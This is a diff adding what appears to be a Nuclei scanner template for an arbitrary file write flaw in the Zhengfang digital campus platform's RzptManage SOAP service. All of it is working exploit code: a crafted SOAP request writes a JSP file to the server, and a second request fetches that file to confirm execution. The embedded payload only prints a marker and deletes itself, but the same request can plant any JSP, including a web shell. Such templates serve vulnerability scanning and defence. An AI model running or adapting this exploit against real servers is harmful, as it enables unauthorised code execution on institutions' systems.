@@ -1,0 +1,47 @@
+id: zfszh-RzptManage-upload
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: 正方数字化校园平台RzptManage存在任意文件写入漏洞，攻击者可通过该漏洞获取服务器权限。
+  reference:
+    - https://github.com/wy876/POC/blob/3731c2067d80483223603737037eff2ed3c44425/%E6%AD%A3%E6%96%B9%E6%95%B0%E5%AD%97%E5%8C%96%E6%A0%A1%E5%9B%AD%E5%B9%B3%E5%8F%B0RzptManage%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+  
+variables:
+  filename: "{{rand_base(6)}}"   
+http:
+  - raw:
+      - |
+        POST /zfca/axis/RzptManage HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
+        Content-Length: 832
+        Accept: application/xml;q=0.9,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Connection: close
+        Content-Type: text/xml;charset=UTF-8
+
+        <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:pub="http://pubService.webServices.zfca.zfsoft.com">
+           <soapenv:Header/>
+           <soapenv:Body>
+              <pub:savePic soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+                 <filepath xsi:type="soapenc:string" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">{{filename}}.jsp</filepath<|meta_end|></filepath>
+                 <bytes xsi:type="soapenc:base64Binary" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">PCUgb3V0LnByaW50bG4obmV3IFN0cmluZyhuZXcgc3VuLm1pc2MuQkFTRTY0RGVjb2RlcigpLmRlY29kZUJ1ZmZlcigiWlRFMk5UUXlNVEV4TUdKaE1ETXdPVGxoTVdNd016a3pNemN6WXpWaU5ETT0iKSkpOyBuZXcgamF2YS5pby5GaWxlKGFwcGxpY2F0aW9uLmdldFJlYWxQYXRoKHJlcXVlc3QuZ2V0U2VydmxldFBhdGgoKSkpLmRlbGV0ZSgpOyU+</bytes>
+              </pub:savePic>
+           </soapenv:Body>
+        </soapenv:Envelope>
+      - |-
+        GET /zfca/{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: keep-alive
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'e165421110ba030'
